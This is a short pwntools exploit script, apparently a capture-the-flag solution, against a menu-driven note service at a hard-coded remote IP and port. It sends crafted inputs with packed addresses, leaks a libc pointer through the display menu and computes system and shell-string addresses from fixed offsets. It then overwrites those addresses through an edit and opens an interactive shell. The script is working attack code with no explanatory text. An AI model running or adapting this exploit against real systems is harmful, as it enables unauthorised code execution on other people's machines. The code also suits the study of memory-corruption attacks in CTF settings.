from pwn import *
import re

r = remote('198.13.45.44', 8005)
r.recvuntil('choice:')
r.sendline('1')
r.recvuntil('Title:')
r.sendline('1')
r.recvuntil('size:')
r.sendline(str(56))
r.recvuntil('brief:')
r.sendline('aaaaaaaa'+p64(0x601fa8)+'A'*(34)+p64(0x400be4))
r.recvuntil('title:')
r.sendline('C')
r.recvuntil('(Y/N)')
r.sendline('Y')
r.recvuntil('choice:')
r.sendline('3')
r.recvuntil('Title:')
r.sendline('1')
r.recvuntil('choice:')
r.sendline('1')
r.recvuntil('Title:')
r.sendline('2')
r.recvuntil('size:')
r.sendline(str(24))
r.recvuntil('brief:')
r.sendline('bbbbbbbbbb')
r.recvuntil('title:')
r.sendline('C')
r.recvuntil('(Y/N)')
r.sendline('Y')

def test():
    r.recvuntil('choice:')
    r.sendline('4')
    return r.recvuntil('=====================')

check = re.findall('@\|(.*)',test())[0]
check = u64(check[5:-4].ljust(8,'\x00'))
sys = check - 556432 + 324672
pwn = check - 556432 + 1785498
r.recvuntil('choice:')
r.sendline('2')
r.recvuntil('title:')
r.sendline('1')
r.recvuntil('title:')
r.sendline('1.1')
r.recvuntil('size:')
r.sendline(str(72))
r.recvuntil('brief:')
r.sendline('aaaaaaaa'+p64(pwn)+'A'*(50-16)+p64(sys))
r.recvuntil('(Y/N)')
r.sendline('Y')
r.recvuntil('choice:')
r.sendline('4')
r.recvuntil('0')
r.interactive()